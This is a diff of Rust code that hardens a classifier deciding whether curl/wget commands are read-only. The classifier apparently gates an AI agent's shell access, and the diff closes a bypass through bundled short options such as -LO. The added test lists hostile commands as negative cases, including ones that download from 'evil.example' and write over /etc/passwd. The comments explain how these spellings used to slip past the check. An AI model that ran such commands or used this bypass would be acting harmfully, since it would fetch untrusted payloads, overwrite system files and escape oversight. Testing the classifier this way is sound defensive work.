@@ -4060,14 +4060,32 @@ fn every_segment_is_allow_or_unmatched_default(
 /// `--request` other than `GET`, no body-uploading flag, no `-K`/`--config`,
 /// and any `-o`/`-O`/`--output` target confined per [`target_is_confined`].
 ///
-/// Code review fix (CRITICAL): `--output=X` (attached with `=`) and the
-/// glued short form `-oFILE` used to match none of the arms below (only the
-/// separate-token `-o`/`--output` did), so an unconfined write via either
-/// spelling silently rode a GET-only curl straight to "read-only". Both are
-/// now routed through the identical `target_is_confined` check. `-K`/
-/// `--config` (and their `=`/glued spellings) load an arbitrary curl config
-/// FILE this text-only classifier cannot see inside -- that file can itself
-/// set `-X`/`-d`/`-o`/anything else -- so it now disqualifies outright.
+/// Code review fix (CRITICAL): `--output=X` (attached with `=`) used to
+/// match none of the arms below (only the separate-token `-o`/`--output`
+/// did), so an unconfined write via that spelling silently rode a GET-only
+/// curl straight to "read-only". Now routed through the identical `target_
+/// is_confined` check. `-K`/`--config` (and its `=` spelling) loads an
+/// arbitrary curl config FILE this text-only classifier cannot see inside --
+/// that file can itself set `-X`/`-d`/`-o`/anything else -- so it now
+/// disqualifies outright.
+///
+/// Code review fix round 2 (CRITICAL): a bundled POSIX short-option cluster
+/// (`-LO`, `-sO`, `-Lo FILE`, `-sfo file`) matched NONE of round 1's exact-
+/// token or glued-prefix arms (each expected the security-relevant letter to
+/// be the FIRST character after the leading `-`), so `-LO`/`-sO`/`-Lo FILE`
+/// silently fell through to the unmatched default and reopened exactly the
+/// `-O`/unconfined-`-o` holes round 1 closed. The final arm below now scans
+/// EVERY character of a leading-`-`, non-`--` token for each short option
+/// this classifier cares about (`X`/`K`/`O`/`o`/`d`/`F`/`T` -- covering `-X`/
+/// `-K`/`-O`/`-o`/`-d`/`-F`/`-T` bundled in any position and order, a
+/// superset of round 1's own glued-form fix, which this replaces), treating
+/// the remainder of the SAME token (if any) or the NEXT argv token (if
+/// nothing remains) as that flag's value -- the identical getopt-style
+/// bundling rule curl's own option parser uses. `X`/`K`/`d`/`F`/`T` always
+/// disqualify when bundled (matching this function's own already-
+/// conservative stance on `-K`, and simpler/safer than re-deriving `-X`'s
+/// "unless the value is GET" leniency for a bundled spelling nobody writes
+/// in practice); `o` confines exactly like the standalone/glued form.
 fn is_curl_or_wget_get_only(tokens: &[String], scratchpad_roots: &[String]) -> bool {
     let Some(program) = tokens.first().map(|t| sql_program_name(t)) else {
         return false;
@@ -4112,17 +4130,45 @@ fn is_curl_or_wget_get_only(tokens: &[String], scratchpad_roots: &[String]) -> b
                 }
             }
             _ if token.starts_with("--config") => return false,
-            // Glued short-option forms: `-oFILE`/`-KFILE`. Checked after
-            // every other arm so the bare `-o`/`-O`/`-K` tokens above still
-            // match those exactly first -- `starts_with` alone cannot tell
-            // `-o` (bare) from `-oFILE` (glued).
-            _ if token.starts_with("-K") && token.len() > 2 => return false,
-            _ if token.starts_with("-o") && token.len() > 2 => {
-                if !target_is_confined(&token[2..], scratchpad_roots) {
+            _ if token.starts_with("--data") => return false,
+            // Bundled/glued POSIX short-option cluster: `-LO`, `-sO`,
+            // `-Lo FILE`, `-oFILE`, `-KFILE`, ... -- any leading-`-`,
+            // non-`--` token, scanned character by character.
+            _ if token.starts_with('-') && !token.starts_with("--") && token.len() > 1 => {
+                let chars: Vec<char> = token.chars().skip(1).collect();
+                let mut disqualified = false;
+                let mut consumed_next_token = false;
+                let mut j = 0;
+                while j < chars.len() {
+                    match chars[j] {
+                        'X' | 'K' | 'F' | 'T' | 'd' | 'O' => {
+                            disqualified = true;
+                            break;
+                        }
+                        'o' => {
+                            let rest: String = chars[j + 1..].iter().collect();
+                            let target = if !rest.is_empty() {
+                                rest
+                            } else {
+                                consumed_next_token = true;
+                                tokens.get(i + 1).cloned().unwrap_or_default()
+                            };
+                            if target.is_empty() || !target_is_confined(&target, scratchpad_roots) {
+                                disqualified = true;
+                            }
+                            break;
+                        }
+                        _ => {}
+                    }
+                    j += 1;
+                }
+                if disqualified {
                     return false;
                 }
+                if consumed_next_token {
+                    i += 1;
+                }
             }
-            _ if token.starts_with("--data") => return false,
             _ => {}
         }
         i += 1;
@@ -5240,6 +5286,38 @@ mod tests {
             assert!(
                 !is_read_only_escape_safe(command, &roots),
                 "{command} should not qualify"
+            );
+        }
+    }
+
+    /// Code review fix round 2 (CRITICAL): a bundled POSIX short-option
+    /// cluster (`-LO`, `-sO`, `-Lo FILE`) never matched any of round 1's
+    /// exact-token or glued-prefix arms, each of which expected the
+    /// security-relevant letter (`o`/`O`/`K`) to be the FIRST character
+    /// after the leading `-`. `-LO`/`-sO`/`-Lo /etc/passwd` therefore fell
+    /// through to the unmatched default and silently reopened exactly the
+    /// `-O`/unconfined-`-o` holes round 1 closed. A benign bundle with no
+    /// security-relevant letter (`-sL`) must still qualify.
+    #[test]
+    fn curl_bundled_short_options_are_scanned_letter_by_letter() {
+        let roots = vec!["/tmp/claude".to_string()];
+        for command in [
+            "curl -LO https://evil.example/payload",
+            "curl -sO https://evil.example/payload",
+            "curl -Lo /etc/passwd https://evil.example/payload",
+        ] {
+            assert!(
+                !is_read_only_escape_safe(command, &roots),
+                "{command} should not qualify"
+            );
+        }
+        for command in [
+            "curl -sL https://example.com",
+            "curl -Lo /tmp/claude/out.log https://example.com",
+        ] {
+            assert!(
+                is_read_only_escape_safe(command, &roots),
+                "{command} should qualify"
             );
         }
     }
